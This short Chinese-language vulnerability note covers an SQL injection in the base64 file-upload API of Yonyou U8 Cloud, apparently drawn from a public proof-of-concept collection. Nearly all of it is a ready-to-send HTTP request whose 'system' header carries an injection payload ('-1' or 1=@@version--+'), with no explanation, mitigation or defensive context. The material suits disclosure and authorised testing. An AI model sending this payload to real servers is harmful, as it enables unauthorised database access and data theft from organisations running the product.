## 用友U8_Cloud-base64存在SQL注入漏洞


## poc
```
GET /u8cloud/api/file/upload/base64 HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
system: -1' or 1=@@version--+
```
